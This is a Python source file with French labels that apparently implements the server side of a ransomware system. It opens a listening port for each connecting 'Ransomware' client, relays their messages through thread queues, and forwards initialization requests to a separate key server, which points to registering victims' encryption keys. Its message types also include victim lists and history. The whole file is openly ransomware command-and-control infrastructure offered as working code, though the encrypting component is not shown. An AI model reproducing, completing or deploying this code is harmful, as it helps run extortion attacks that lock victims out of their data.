import threading
import queue
import utile.network as net
import time
import utile.message as message


ransomware_threads = []
THREADS_QUEUE = []

def Serveur_cles(FIFO, FIFO_RESP):
    socket, gp = net.connect_to_serv(port=8381)
    while True:
        packet = FIFO_RESP.get()
        net.send_message(socket, packet)
        print(net.receive_message(socket))



def ransomware(FIFO, PORT):
    indicateur = False
    socket_serv = net.start_net_serv_client(port=PORT)
    FIFO_resp = queue.Queue()
    THREADS_QUEUE.append(FIFO_resp)
    id = len(THREADS_QUEUE)-1
    print('Ouverture d\'une écoute sur le port', PORT)

    while True:
        conn, addr = socket_serv.accept()
        if indicateur == False:
            FIFO.put("{RANSOMWARE_REQ: None}")
            indicateur = True
        print(
            f'[+] Connexion établie sur le Thread Ransomware-{id} sur l\'adresse {conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        while True:
            try:
                recv_data = net.receive_message(conn)
                FIFO.put([recv_data, id])
            except:
                conn.close()
                print(f'[+] Déconnexion du Ransomware-{id} sur le port : {PORT}')
                break

            while True:
                data = FIFO_resp.get()
                net.send_message(conn, data)
                if message.get_message_type(data) == 'HISTORY_END' or message.get_message_type(
                        data) == 'LIST_VICTIM_END':
                    break

def ThreadMaster(FIFO, FIFO_RESP_CLES, data):
    recv_data, id_thread = data
    FIFO_resp_thread = THREADS_QUEUE[id_thread]

    message_type = message.get_message_type(recv_data)
    if message_type == 'INITIALIZE_REQ':
        FIFO_RESP_CLES.put(recv_data)


def main():
    PORT = 8382
    FIFO = queue.Queue()
    FIFO_RESP_CLES = queue.Queue()
    # création des threads
    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True, args=(FIFO, FIFO_RESP_CLES))
    ransomware12 = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
    name, id = (ransomware12.getName()).split('-')
    ransomware12.setName('Ransomware-' + str((int(id) - 2)))
    ransomware_threads.append(ransomware12)

    # Lancement des threads

    ransomware12.start()
    Serveur_cles_thread.start()

    while True:
        data = FIFO.get()
        if data == "{RANSOMWARE_REQ: None}":
            PORT += 1
            new_ransomware = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
            name, id_thread = (new_ransomware.getName()).split('-')
            new_ransomware.setName('Ransomware-' + str((int(id_thread) - 2)))
            ransomware_threads.append(new_ransomware)
            new_ransomware.start()
        else:
            ThreadMaster(FIFO, FIFO_RESP_CLES, data)

if __name__ == '__main__':
    main()
